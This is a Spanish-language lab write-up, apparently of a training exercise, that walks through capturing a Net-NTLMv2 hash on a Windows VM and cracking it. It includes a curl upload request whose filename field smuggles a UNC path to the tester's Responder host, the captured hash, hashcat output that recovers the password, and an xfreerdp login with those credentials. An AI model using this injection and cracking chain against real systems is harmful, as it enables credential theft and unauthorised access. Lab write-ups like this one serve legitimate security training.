# Walk: Password Attacks - Cracking Net-NTLMv2 - VM #2

## Fecha: 26/02/2025
## Host: Windows
## IP: 192.168.120.210
## Objetivo
Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application. Important: Add **marketingwk01** to your **/etc/hosts** file with the corresponding IP address of the machine. After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.
## Herramientas
1. nmap
2. burp
3. curl
4. hashcat
5. responder
## Procedimiento y comandos
#### Paso 1: Enumeracion para encontrar el vector de ataque.
1. `nmap -sV --open 192.168.120.210 -oN nmap-result.txt`
```
nmap -sV --open 192.168.130.210 -oN nmap-result.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 12:26 -03
Nmap scan report for 192.168.130.210
Host is up (0.19s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.29 seconds
```
2. Agregamos la ip y el dns como lo suguiere la consigna:
- `echo "192.168.130.210 marketingwk01.com" | sudo tee -a /etc/hosts`
3. Exploramos marketingwk01:8000 y encontramos un formulario para subir archivos.
#### Paso 2: Obtenemos el hash
1. Subimos un archivo cualquiera y obtenemos la cabecera con burp.
2. Activamos nuestro listener _**responder**_
`responder -I tun0`
3. Podemos utilizar burp para ejecutar nuestra injeccion de path _**UNC**_ en el parametro _**filename**_
- Pero Utilizaremos curl.
```
curl -X POST "http://marketingwk01.com:8000/upload" \
     -H "Host: marketingwk01.com:8000" \
     -H "Cache-Control: max-age=0" \
     -H "Accept-Language: en-US,en;q=0.9" \
     -H "Origin: http://marketingwk01.com:8000" \
     -H "Content-Type: multipart/form-data" \
     -H "Upgrade-Insecure-Requests: 1" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36" \
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
     -H "Referer: http://marketingwk01.com:8000/" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Connection: keep-alive" \
     -F "myFile=@/dev/null;filename=/\/\/\/\192.168.45.200/\/\readme.txt"
```
4. En nuestra consola _responder_ obtenemos el hash y lo guardamos en un archivo _**.hash**_
```
[+] Listening for events...                                                                                                                                                                                  
[SMB] NTLMv2-SSP Client   : 192.168.120.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:7e1f3da645df578e:AD2063441D26C4D54C09E179F10C11F9:010100000000000080F1B7FAA288DB01625CED4BC9E6F12D0000000002000800460050005000360001001E00570049004E002D00410041003500300037005000320037004F003100540004003400570049004E002D00410041003500300037005000320037004F00310054002E0046005000500036002E004C004F00430041004C000300140046005000500036002E004C004F00430041004C000500140046005000500036002E004C004F00430041004C000700080080F1B7FAA288DB010600040002000000080030003000000000000000000000000020000014FF970AEB8E8416F1E5D5B21CFFB7AEE516480F1CC791C83444E1D0E07BF22E0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300030000000000000000000                                                                                                    
```

```
 echo "sam::MARKETINGWK01:7e1f3da645df578e:AD2063441D26C4D54C09E179F10C11F9:010100000000000080F1B7FAA288DB01625CED4BC9E6F12D0000000002000800460050005000360001001E00570049004E002D00410041003500300037005000320037004F003100540004003400570049004E002D00410041003500300037005000320037004F00310054002E0046005000500036002E004C004F00430041004C000300140046005000500036002E004C004F00430041004C000500140046005000500036002E004C004F00430041004C000700080080F1B7FAA288DB010600040002000000080030003000000000000000000000000020000014FF970AEB8E8416F1E5D5B21CFFB7AEE516480F1CC791C83444E1D0E07BF22E0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300030000000000000000000" > sam.hash
```
#### Paso 3: Crackeamos el hash
1. Bucamos el modo de hashcat:
```
  hashcat -h | grep "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM        
```
> 5600 | NetNTLMv2                                                  | Network Protocol
2. Ejecutamos hashcat:
```
hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force
SAM::MARKETINGWK01:7e1f3da645df578e:ad2063441d26c4d54c09e179f10c11f9:010100000000000080f1b7faa288db01625ced4bc9e6f12d0000000002000800460050005000360001001e00570049004e002d00410041003500300037005000320037004f003100540004003400570049004e002d00410041003500300037005000320037004f00310054002e0046005000500036002e004c004f00430041004c000300140046005000500036002e004c004f00430041004c000500140046005000500036002e004c004f00430041004c000700080080f1b7faa288db010600040002000000080030003000000000000000000000000020000014ff970aeb8e8416f1e5d5b21cffb7aee516480f1cc791c83444e1d0e07bf22e0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300030000000000000000000:DISISMYPASSWORD
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SAM::MARKETINGWK01:7e1f3da645df578e:ad2063441d26c4d...000000
Time.Started.....: Wed Feb 26 23:23:37 2025, (19 secs)
Time.Estimated...: Wed Feb 26 23:23:56 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   613.4 kH/s (8.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11255808/14344385 (78.47%)
Rejected.........: 0/11255808 (0.00%)
Restore.Point....: 11247616/14344385 (78.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: DR3KSILL0 -> DIGNITY777
Hardware.Mon.#1..: Temp: 64c Util: 84%
```
> password: _**DISISMYPASSWORD**_
#### Paso 3: Nos conectamos por _RDP_ y obtenemos el flag
1. Ejecutamos xfreerdp con las credenciales que encontramos:
`xfreerdp /v:192.168.120.210 /u:sam /p:DISISMYPASSWORD +clipboard /cert:ignore`
2. Obtenemos el flag en Desktop del usuario _sam_
